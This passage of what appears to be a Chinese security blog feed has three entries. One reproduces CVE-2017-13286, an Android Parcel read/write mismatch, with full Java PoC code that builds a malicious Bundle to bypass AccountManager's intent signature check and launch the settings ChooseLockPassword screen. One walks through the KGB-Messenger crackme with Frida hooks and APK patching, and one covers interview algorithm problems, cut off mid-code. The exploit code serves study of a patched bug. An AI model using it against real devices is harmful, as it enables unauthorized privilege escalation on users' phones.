class="line">&#125;</span><br></pre></td></tr></table></figure><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20210830001512798.png" alt="image-20210830001512798" style="zoom:67%;" /><h2 id="Android-bug-69683251"><a href="#Android-bug-69683251" class="headerlink" title="Android-bug-69683251"></a>Android-bug-69683251</h2><p>该漏洞为<code>android/hardware/camera2/params/OutputConfiguration</code>中的序列化与反序列化存在不一致漏洞。<br>该漏洞本身属于<code>camera2</code>的一个参数处理缺陷，但是可以被利用起来绕过<code>Android-bug-7699048</code>的补丁，继续导致<code>launchAnyWhere</code>。</p><p>先来看这个类的序列化和反序列化方法，可以看到writeToParcel()写入的mIsShared没有在OutputConfiguration()中被读出，这将导致读写内存错位。<br>内存读写错位可能会导致一个<code>OutputConfiguration</code>在传递前后发生变化。当然，如果变化只发生在<code>OutputConfiguration</code>内部，可能造成的威胁有限，需要借助这个错位，把错误扩散到其他地方。</p><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20210830095627897.png" alt="image-20210830095627897"></p><p>回顾<code>Android-bug-7699048</code>的补丁，<code>system_server</code>增加了对传输的<code>intent</code>的签名检查，而借助<code>Android-bug-69683251</code>，可以绕过签名检查。</p><p>首先，在<code>MyAuthenticator.addAccount()</code>中构造如下bundle数据并返回。</p><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20210830210007681.png" alt="image-20210830210007681"></p><ol><li><p>即将返回的bundle数据包含三个部分：一个<code>OutputConfiguration</code>对象的数据，一个bytesArray和用于填充的Padding字符串。<br><code>OutputConfiguration</code>部分：len1表示key1的长度,type1表示该部分是一个<code>Parcel(VAL_PARCEL=4)</code>，value1为具体内容，”outputconfig”(实为”android.hardware.camera2.params.OutputConfiguration”)指明了对象的类型，后续六个32bit数是其内部属性。<br><code>BytesArray</code>部分：len2=1指示key2长度为1，type2表明该部分是一个<code>ByteArray(VAL_BYTEARRAY = 13)</code>，value2是具体的byteArray值。<br>但是，value2的具体内容需要特别构造。首先需要包含一个调用<code>com.android.settings.ChooseLockPassword</code>的Intent，然后在前面插入这段数据的长度。在第一次反序列化操作中，value2将被视作一段byteArray，第二次反序列化操作中将被视作一个完整的Intent。<br><code>Padding</code>就是一段用于填充末尾的字符串键值对。<br>上述操作为手动构造排布，可以认为是第一次序列化。</p></li><li><p>第一次反序列化，在<code>AccountManagerService.Session$onResult(Bundle bundle)</code>中执行。<br>补丁中，尝试用<code>intent=result.getParcelable(AccountManager.KEY_INTENT)</code>从<code>bundle result</code>中提取一个intent，然后检查该intent的签名是否合法。<br>但是，手动构造返回的<code>bundle result</code>并没有包含intent键值对，因为当前会解析发现intent的具体数据内含在byteArray中，这里绕过了补丁的签名验证。<br>具体来说，反序列化操作可以顺利得到<code>OutputConfiguration</code>对象，但是由于它不读出<code>mIsShared</code>，反而把构造的<code>mIsShared=0</code>读入为<code>ArrayList=0</code>（ArrayList的读出代码如下图所示），这指明<code>OutputConfiguration</code>对象数据的结束。开始读取下一个键值对，即ByteArray，intent的数据被当作byteArray的一部分被读取。</p><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20210830220128784.png" alt="image-20210830220128784"></p></li><li><p>第二次序列化，发生在<code>response.onResult(result);</code>语句，把<code>bundle result</code>返回给AppA中的<code>IAccountManagerResponse.onResult(bundle bundle)</code>，result需要进行序列化，由系统完成。<br>具体来说，因为<code>OutputConfiguration</code>的读入写出操作不一致，它将向bundle中多写入一个<code>int mIsShared = 0</code>，后续的数据保持不变。</p></li><li><p>第二次反序列化，发生在<code>IAccountManagerResponse.onResult(bundle bundle)</code>，该方法将从bundle中取出一个intent并调用。这个时候，在格式上原本被包含在byteArray中的intent数据会因为<code>OutputConfiguration</code>的读入操作而显现为一个独立合法的键值对。<br>具体来说，由于<code>OutputConfiguration</code>不读出<code>mIsShared</code>，所以在第二次序列化中多写入的<code>mIsShared=0</code>会被错位赋给<code>listLen</code>，同样指明当前<code>OutputConfiguration</code>对象的结束。而原本的<code>listLen=0</code>被认为是后续数据的组成部分，第二个键值对也因此被解析为<code>len2=0 key2=1 type2=6</code>,表明这是一个<code>long</code>数字，键值长8个字节，由原本的<code>type2=13</code>与<code>value2[0:4],也即intent的长度数字</code>构成，完成对<code>long</code>的解析。因此，接下来的数据便是byteArray，也即<code>intent</code>的具体内容，恶意intent将被正常解析，由此显现为第三个键值对。</p><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20210830210007681.png" alt="image-20210830210007681"></p></li></ol><p>具体构造代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> Bundle <span class="title">addAccount</span><span class="params">(AccountAuthenticatorResponse response, String accountType, String authTokenType, String[] requiredFeatures, Bundle options)</span> <span class="keyword">throws</span> NetworkErrorException </span>&#123;</span><br><span class="line"></span><br><span class="line">    Bundle retBundle = <span class="keyword">new</span> Bundle();</span><br><span class="line">    Parcel bundleData = Parcel.obtain();</span><br><span class="line">    Parcel craftData = Parcel.obtain();</span><br><span class="line">    <span class="comment">//craftData是传递的Bundle载荷，这里先手动构造载荷内容，然后补上Bundle格式头</span></span><br><span class="line">    craftData.writeInt(<span class="number">3</span>); <span class="comment">// 总共传递3个对象,即三个键值对</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 第一个Key为OutputConfiguration，它将用来引起内存错位从而绕过检查</span></span><br><span class="line">    craftData.writeString(<span class="string">&quot;object1&quot;</span>);<span class="comment">//这个object的名字,似乎长度有些要求</span></span><br><span class="line">    craftData.writeInt(<span class="number">4</span>); <span class="comment">// VAL_PARCELABLE = 4</span></span><br><span class="line">    craftData.writeString(<span class="string">&quot;android.hardware.camera2.params.OutputConfiguration&quot;</span>); <span class="comment">// value类型为OutputConfiguration，将被按照outputConfiguration的格式/方法解析</span></span><br><span class="line">    craftData.writeInt(<span class="number">1</span>);<span class="comment">//Rotation 这里开始是outputConfiguration的属性</span></span><br><span class="line">    craftData.writeInt(<span class="number">1</span>);<span class="comment">//SurfaceSetId</span></span><br><span class="line">    craftData.writeInt(<span class="number">1</span>);<span class="comment">//SurfaceType</span></span><br><span class="line">    craftData.writeInt(<span class="number">1</span>);<span class="comment">//width</span></span><br><span class="line">    craftData.writeInt(<span class="number">1</span>);<span class="comment">//Height</span></span><br><span class="line">    craftData.writeInt(<span class="number">1</span>);<span class="comment">//IsDeferred</span></span><br><span class="line">    <span class="comment">//在system_server处的序列化中，会直接写出为IsShared=0</span></span><br><span class="line">    craftData.writeInt(<span class="number">0</span>);<span class="comment">//在第一次反序列化中被赋给listLen，指明停止第一个outputConfiguration部分的读入，</span></span><br><span class="line">    craftData.writeInt(<span class="number">1</span>);<span class="comment">//在第一次反序列化中表示第二个键名的长度，第二次反序列化因为错位被解析为第二个键名</span></span><br><span class="line">    craftData.writeInt(<span class="number">6</span>);<span class="comment">//在第一次反序列化中表示第二个键名，第二次反序列化因为错位被解析为第二个键的类型</span></span><br><span class="line">    craftData.writeInt(<span class="number">13</span>);<span class="comment">//在第一次反序列化中表示第二个键的类型，表示ByteArray，第二次反序列化因为错位被解析为第二个键的键值</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 接下来构造ByteArray，内含一个Intent的完整数据。</span></span><br><span class="line">    craftData.writeInt(-<span class="number">1</span>); <span class="comment">// 这个位置用于存放intent部分的长度，先占位，构造完之后计算长度再来写入</span></span><br><span class="line">    <span class="keyword">int</span> keyIntentStartPos = craftData.dataPosition();  <span class="comment">// 记录intent部分在craftData中起始位置，因为接下来要构造intent了</span></span><br><span class="line">    craftData.writeString(AccountManager.KEY_INTENT);<span class="comment">// 第二个object是个intent</span></span><br><span class="line">    craftData.writeInt(<span class="number">4</span>); <span class="comment">//intent也是一个parcel</span></span><br><span class="line">    craftData.writeString(<span class="string">&quot;android.content.Intent&quot;</span>);<span class="comment">// value类型为intent，将被按照intent格式解析</span></span><br><span class="line">    craftData.writeString(Intent.ACTION_RUN); <span class="comment">// Intent Action 这里开始是intent的属性</span></span><br><span class="line">    Uri.writeToParcel(craftData, <span class="keyword">null</span>); <span class="comment">// Uri</span></span><br><span class="line">    craftData.writeString(<span class="keyword">null</span>); <span class="comment">// Type</span></span><br><span class="line">    craftData.writeInt(<span class="number">0x10000000</span>); <span class="comment">// Flags</span></span><br><span class="line">    craftData.writeString(<span class="keyword">null</span>); <span class="comment">// Package</span></span><br><span class="line">    craftData.writeString(<span class="string">&quot;com.android.settings&quot;</span>); <span class="comment">// setComponet(pkg=&quot;com.android.settings&quot;,</span></span><br><span class="line">   craftData.writeString(<span class="string">&quot;com.android.settings.ChooseLockPassword&quot;</span>);<span class="comment">//cls=&quot;com.ChooseLockPassword&quot;</span></span><br><span class="line">    craftData.writeInt(<span class="number">0</span>); <span class="comment">//SourceBounds</span></span><br><span class="line">    craftData.writeInt(<span class="number">0</span>); <span class="comment">//Categories</span></span><br><span class="line">    craftData.writeInt(<span class="number">0</span>); <span class="comment">//Selector</span></span><br><span class="line">    craftData.writeInt(<span class="number">0</span>); <span class="comment">//ClipData</span></span><br><span class="line">    craftData.writeInt(-<span class="number">2</span>); <span class="comment">//ContentUserHint</span></span><br><span class="line">    craftData.writeBundle(<span class="keyword">null</span>);<span class="comment">//结束</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> keyIntentEndPos = craftData.dataPosition(); <span class="comment">// 记录当前的读写指针位置，也即intent部分的结束位置</span></span><br><span class="line">    <span class="keyword">int</span> lengthOfKeyIntent = keyIntentEndPos - keyIntentStartPos; <span class="comment">// 计算intent数据的长度</span></span><br><span class="line">    craftData.setDataPosition(keyIntentStartPos - <span class="number">4</span>);  <span class="comment">// 把读写指针位移动到intent部分起始位-4,即-1所在的位置</span></span><br><span class="line">    craftData.writeInt(lengthOfKeyIntent);<span class="comment">// 在intent部分前写入key_intent这段数据的长度</span></span><br><span class="line">    craftData.setDataPosition(keyIntentEndPos);<span class="comment">// 将读写指针移动到最后</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 这里构造一个用于填充的键值对</span></span><br><span class="line">    craftData.writeString(<span class="string">&quot;PaddingK&quot;</span>);</span><br><span class="line">    craftData.writeInt(<span class="number">0</span>); <span class="comment">// VAL_STRING</span></span><br><span class="line">    craftData.writeString(<span class="string">&quot;PaddingV&quot;</span>); </span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> length  = craftData.dataSize();</span><br><span class="line">    bundleData.writeInt(length); <span class="comment">//所有数据的长度</span></span><br><span class="line">    bundleData.writeInt(<span class="number">0x4c444E42</span>); <span class="comment">//Bundle魔数</span></span><br><span class="line">    bundleData.appendFrom(craftData, <span class="number">0</span>, length); <span class="comment">//把构造的载荷加载后面</span></span><br><span class="line">    bundleData.setDataPosition(<span class="number">0</span>);<span class="comment">//移动Parcel的读写指针位置到开头用于读进retBundle</span></span><br><span class="line">    retBundle.readFromParcel(bundleData);</span><br><span class="line">    <span class="keyword">return</span> retBundle;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>完整代码：<a href="https://github.com/slient2009/CVE-PoCs">slient2009/CVE-PoCs (github.com)</a></p><p>这个bug的修复非常简单，添加<code>mIsShared</code>的读入就好。</p><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20210830233234494.png" alt="image-20210830233234494"></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;参考相关博客，对CVE-2017-13286进行复现。&lt;br&gt;第一次复现CVE，很多知识现学现用，代码也是“借鉴”了不少。&lt;/p&gt;</summary>
    
    
    
    
    <category term="Android" scheme="http://slient2009.github.io/tags/Android/"/>
    
    <category term="CVE" scheme="http://slient2009.github.io/tags/CVE/"/>
    
  </entry>
  
  <entry>
    <title>KGB-Messenger：静态分析、Frida动态调试、Apktool回编译的复习</title>
    <link href="http://slient2009.github.io/2021/08/22/KGB-Messenger/"/>
    <id>http://slient2009.github.io/2021/08/22/KGB-Messenger/</id>
    <published>2021-08-22T04:00:00.000Z</published>
    <updated>2021-09-09T08:52:43.000Z</updated>
    
    <content type="html"><![CDATA[<p>本文以一个开源的Android Crackme–KGB-Messenger，作为实验对象，把最近学习的Frida动态调试和Apktool回编译流程复习一下。</p><span id="more"></span><p>步骤参考自非虫-Android软件安全权威指南以及<a href="https://blog.csdn.net/sinat_29712445/article/details/48104019">apk文件反编译、回编译和签名之完全教程</a></p><p>本次实验使用开源的Android逆向Crackme <a href="https://github.com/tlamb96/kgb_messenger"><code>KGB-Messenger</code></a></p><h2 id="安装apktool"><a href="#安装apktool" class="headerlink" title="安装apktool"></a>安装apktool</h2><ol><li>下载 Windows版本的 <a href="https://raw.githubusercontent.com/iBotPeaches/Apktool/master/scripts/windows/apktool.bat">wrapper script</a> (右键链接另存为 <code>apktool.bat</code>)</li><li>下载 apktool (<a href="https://bitbucket.org/iBotPeaches/apktool/downloads/">下载列表</a>)</li><li>重命名上步下载的 jar 包为 <code>apktool.jar</code></li><li>将 <code>apktool.bat</code>和<code>apktool.jar</code>移动到同一个目录下 (不运行apktool.bat) 并将此文件夹添加进环境变量</li><li>使用 <code>apktool -version</code> 验证是否配置成功，出现版本号则说明配置成功</li></ol><h2 id="逆向分析"><a href="#逆向分析" class="headerlink" title="逆向分析"></a>逆向分析</h2><p>该Crackme还是比较入门的，先拖进Jeb静态逆向分析，结合frida动态调试把flag找出来。</p><p>先是一个环境检查，要求设备的所属地区为<code>Russia</code>，且用户名为<code>RkxBR3s1N0VSTDFOR180UkNIM1J9Cg==</code>（解码为<code>FLAG&#123;57ERL1NG_4RCH3R&#125;</code>），不然直接弹窗提示错误信息。直接Hook绕过。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> System = Java.use(<span class="string">&quot;java.lang.System&quot;</span>);</span><br><span class="line">System.getProperty.overload(<span class="string">&quot;java.lang.String&quot;</span>).implementation = function(argStr)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Russia&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        System.getenv.overload(<span class="string">&#x27;java.lang.String&#x27;</span>).implementation = function(str)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;RkxBR3s1N0VSTDFOR180UkNIM1J=9Cg==&quot;</span>;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>接下来验证用户名和密码。<br>通过伪代码可以看到，用户名得是<code>codenameduchess</code>，且指定了密码的md5值。<br>把md5值去掉开头的6位和末尾的8位，然后到<a href="https://www.somd5.com/">somd5</a>去查，得到明文为<code>guest</code>。<br>输入合法的用户名和密码，<code>LoginActivity.i()</code>会Toast出第二个<code>FLAG&#123;GOOG13_PRO&#125;</code>。</p><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20210822194617036.png" alt="image-20210822194617036"></p><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20210822194622824.png" alt="image-20210822194622824"></p><p>接下来来到聊天界面<code>MessengerActivity</code>。</p><p><code>MessengerActivity.onSendMessage()</code>作为发送的监听函数，大致反应了最后一关的逻辑：<br>先后发送两句话，分别满足<code>this.a(v1.toString()).equals(this.p)</code>和<code>this.b(v1.toString()).equals(this.r)</code>的要求，然后在<code>this.i()</code>方法中，基于这两句话构造出最后一个flag。<br><code>this.a()</code>是一个可逆的加密算法，<code>this.b()</code>不可逆，需要爆破然后手动补全，代码如下：</p><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20210822195538116.png" alt="image-20210822195538116"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">pp = <span class="string">&quot;V@]EAASB\u0012WZF\u0012e,a$7(&amp;am2(3.\u0003&quot;</span></span><br><span class="line">p = <span class="built_in">list</span>(pp)</span><br><span class="line">lp = <span class="built_in">len</span>(p)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> ind <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, lp//<span class="number">2</span>):</span><br><span class="line">    tmp = p[ind]</span><br><span class="line">    p[ind] = <span class="built_in">chr</span>(<span class="built_in">ord</span>(p[lp-ind-<span class="number">1</span>]) ^ <span class="number">65</span>)</span><br><span class="line">    p[lp - ind -<span class="number">1</span>] = <span class="built_in">chr</span>(<span class="built_in">ord</span>(tmp) ^ <span class="number">50</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>.join(p))</span><br><span class="line"></span><br><span class="line">rr = <span class="string">&quot;\u0000dslp&#125;oQ\u0000 dks$|M\u0000h +AYQg\u0000P*!M$gQ\u0000&quot;</span></span><br><span class="line">r = <span class="built_in">list</span>(rr)</span><br><span class="line">lr = <span class="built_in">len</span>(r)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> ind <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, lr//<span class="number">2</span>):</span><br><span class="line">    tmp = r[ind]</span><br><span class="line">    r[ind] = r[lr-ind-<span class="number">1</span>]</span><br><span class="line">    r[lr-ind-<span class="number">1</span>] = tmp</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> ind <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, lr):</span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">128</span>):</span><br><span class="line">        <span class="keyword">if</span>(c&gt;&gt;(ind%<span class="number">8</span>) ^ c == <span class="built_in">ord</span>(r[ind])):</span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">chr</span>(c), end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"><span class="comment"># 输出为</span></span><br><span class="line"><span class="comment"># Boris, give me the password</span></span><br><span class="line"><span class="comment"># ay I *PEASE* hve the assword  手动补全为 May I *PEASE* have the Password?</span></span><br></pre></td></tr></table></figure><p>最终得到第三个flag：<code>FLAG&#123;p455w0rd_P134SE&#125;</code></p><p><strong>字符串00截断</strong></p><p><code>MessengerActivity.r=&quot;\u0000dslp&#125;oQ\u0000 dks$|M\u0000h +AYQg\u0000P*!M$gQ\u0000&quot;</code>，该字符串以00开头，frida在处理时应该是默认截断了。<br>因此通过frida的console.log打印为空，事实上，通过JS代码的调用都不能获取到该字符串的真实值。<br>这个问题在frida的<a href="https://github.com/frida/frida-java-bridge/issues/167">issue</a>下面有所讨论，但是官方貌似还没修。</p><h2 id="解包修改"><a href="#解包修改" class="headerlink" title="解包修改"></a>解包修改</h2><p>先用apktool反编译出smali代码</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apktool d kgb-messenger.apk -o kgb</span><br></pre></td></tr></table></figure><p>使用VScode打开<code>kgb</code>目录，配合支持smali高亮的插件，就可以便捷修改。</p><p><strong>先过开屏校验-地区和用户，伪代码如下：</strong></p><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20210822171222492.png" alt="image-20210822171222492"></p><p>这里的检查结果对之后的运行没有影响，只决定是否发生activitiy之间的跳转。<br>所以粗暴处理，直接把红框中代码对应的smali全部删除。<br>当然，smali代码的排布跟java层的代码有所区别，并非线性对应，需要结合寄存器操作划定删除的部分。<br>我直接把<code>setcontentview()</code>之后、包括调用<code>a.a.a.a.a.a()</code>之间的代码全部注释，然后把末尾跳转到<code>goto_0</code>的语句改成<code>return-void</code>。</p><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20210822171549896.png" alt="image-20210822171549896"></p><p>笔者也试过仅修改v.equals()的返回值校验，即两个<code>if-nez</code>语句，不过没有成功。</p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20210822112707403.png" alt="image-20210822112707403" style="zoom:67%;" /><p><strong>过用户名和密码检查</strong></p><p>在<code>LoginActivity</code>中，把用户名和密码保存在this.n和this.o两个成员变量中，之后在调用成员变量进行校验。<br>所以直接在获取之后、调用校验之前，添加两行代码把this.n和this.o强行修改为合法值。<br>这样一来，即使不输入任何值，也能成功登录。</p><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20210822172249232.png" alt="image-20210822172249232"></p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20210822172642033.png" alt="image-20210822172642033" style="zoom: 80%;" /><h2 id="获取最终flag"><a href="#获取最终flag" class="headerlink" title="获取最终flag"></a>获取最终flag</h2><p>来到<code>MessengerActivity</code><br>修改的思路同前：修改equals()的返回值校验进入两个if语句分支，然后在合适的时机把对应的成员变量修改为合法值，只需要随便输入一句话，就能获得flag。</p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20210822173624384.png" alt="image-20210822173624384" style="zoom:80%;" /><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20210822173621209.png" alt="image-20210822173621209" style="zoom:80%;" /><h2 id="回编"><a href="#回编" class="headerlink" title="回编"></a>回编</h2><p>修改完smali代码就需要回编译得到apk，仍然可以使用apktool回编。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apktool b .\kgb\</span><br></pre></td></tr></table></figure><p>在dist目录下找到回编得到的apk并安装，发现安装报错，因为这个apk还没有被签名。</p><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20210822113407609.png" alt="image-20210822113407609"></p><p>先用<code>keytool</code>来生成一份自签名证书，然后使用<code>jarsigner</code>来签名apk文件。<br>这两个程序都在jdk中，有环境变量就能直接使用。（Windows Terminal 可能有编码问题，可以在cmd中进行）</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 根据提示设置密码并填入开发者信息，最后输入y确定</span></span><br><span class="line">keytool -genkey -alias key.store -keyalg RSA -validity 20000 -keystore key.store</span><br><span class="line"><span class="meta">#</span><span class="bash"> 开始签名，需要根据提示输入证书的密码</span></span><br><span class="line">jarsigner -verbose -keystore key.store -signedjar apk-after-sign.apk apk-before-sign.apk key.store</span><br><span class="line"><span class="meta">#</span><span class="bash"> 安装已签名apk到设备</span></span><br><span class="line">adb install apk-after-sign.apk</span><br></pre></td></tr></table></figure><p>运行软件，通过环境检查，不输入用户名和密码也能直接进入聊天界面，相较于之前，现在随便发一句话就能获得flag。</p><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20210822174958584.png" alt="image-20210822174958584"></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;本文以一个开源的Android Crackme–KGB-Messenger，作为实验对象，把最近学习的Frida动态调试和Apktool回编译流程复习一下。&lt;/p&gt;</summary>
    
    
    
    
    <category term="Android" scheme="http://slient2009.github.io/tags/Android/"/>
    
  </entry>
  
  <entry>
    <title>两个面试算法题</title>
    <link href="http://slient2009.github.io/2021/08/16/Programming-Problems/"/>
    <id>http://slient2009.github.io/2021/08/16/Programming-Problems/</id>
    <published>2021-08-16T04:00:00.000Z</published>
    <updated>2021-09-09T08:46:55.000Z</updated>
    
    <content type="html"><![CDATA[<p>记录两个在面试过程中遇到的题目。</p><span id="more"></span><h1 id="字节跳动-IP限制"><a href="#字节跳动-IP限制" class="headerlink" title="字节跳动-IP限制"></a>字节跳动-IP限制</h1><p>类似题目：<a href="https://www.nowcoder.com/questionTerminal/8389e1ccd47d40ba859c2497a428d0ca">https://www.nowcoder.com/questionTerminal/8389e1ccd47d40ba859c2497a428d0ca</a></p><p>给出含有大量的IP地址的列表，再进行多次IP询问，返回当前IP是否在列表中出现过。<br>牛客网上有相似的题目，增加了IP段的记录，这里就实现稍难的版本。</p><p><img src="C:\Users\wenake\AppData\Roaming\Typora\typora-user-images\image-20210816204035423.png" alt="image-20210816204035423"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">输入</span><br><span class="line"><span class="number">5</span> <span class="number">3</span></span><br><span class="line"><span class="number">222.205</span><span class="number">.58</span><span class="number">.16</span></span><br><span class="line">*<span class="number">.58</span><span class="number">.16</span></span><br><span class="line"><span class="number">222.205</span><span class="number">.58</span>.*</span><br><span class="line">*<span class="number">.16</span></span><br><span class="line"><span class="number">224.</span>*</span><br><span class="line"><span class="number">222.205</span><span class="number">.58</span><span class="number">.17</span></span><br><span class="line"><span class="number">222.205</span><span class="number">.59</span><span class="number">.19</span></span><br><span class="line"><span class="number">223.205</span><span class="number">.59</span><span class="number">.16</span></span><br><span class="line"></span><br><span class="line">输出</span><br><span class="line"><span class="number">1</span> <span class="number">0</span> <span class="number">1</span></span><br><span class="line"></span><br><span class="line">说明</span><br><span class="line">由于<span class="number">222.205</span><span class="number">.58</span><span class="number">.17</span>这个IP匹配到<span class="number">222.205</span><span class="number">.58</span>.*这条过滤规则，</span><br><span class="line"><span class="number">222.205</span><span class="number">.59</span><span class="number">.19</span>没有匹配到任何过滤规则，</span><br><span class="line"><span class="number">223.205</span><span class="number">.59</span><span class="number">.16</span>匹配到*<span class="number">.16</span>这条过滤规则，</span><br><span class="line">所以输出<span class="number">1</span> <span class="number">0</span> <span class="number">1</span></span><br></pre></td></tr></table></figure><p>比较简单的实现方法是使用HashMap或者类似的结构，比较无脑，但是显然面试官不大想看到这样的做法。<br>于是反手掏出字典树来实现，每个节点有256个子节点。</p><p>这里的通配符*有前驱和后继两种形式，再加上普通的IP地址形式，总共可以分为三类IP地址。<br>所以我对应建了三棵树，普通IP全匹配，通配符在后的匹配前缀，通配符在前的先逆序一下，转换为匹配前缀的问题。<br>事实上前缀匹配可以看作是全匹配的特殊形式，所以在插入和查询的时候，这两类问题合在一起完成。</p><p>对于字典树的节点，首先是动态添加节点，每个节点包含指向256个子节点的指针数组，和一个bool值标记从根到当前节点是否为一个被记录过的IP段，可以及时返回查询IP是否在目标范围中。<br>扫描树节点的时候，先检查标记看看当前是否在一个记录过的IP端中，在则返回true；然后检查是否有对应的子节点，没有则返回false；接着再去子节点，能扫完树说明也在目标IP范围内，返回true。</p><p>另外，我觉得对于字符串的处理稍微有点儿麻烦。这里把*映射为-1，并补全IP为4位，再调整对齐。<br>代码如下：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span 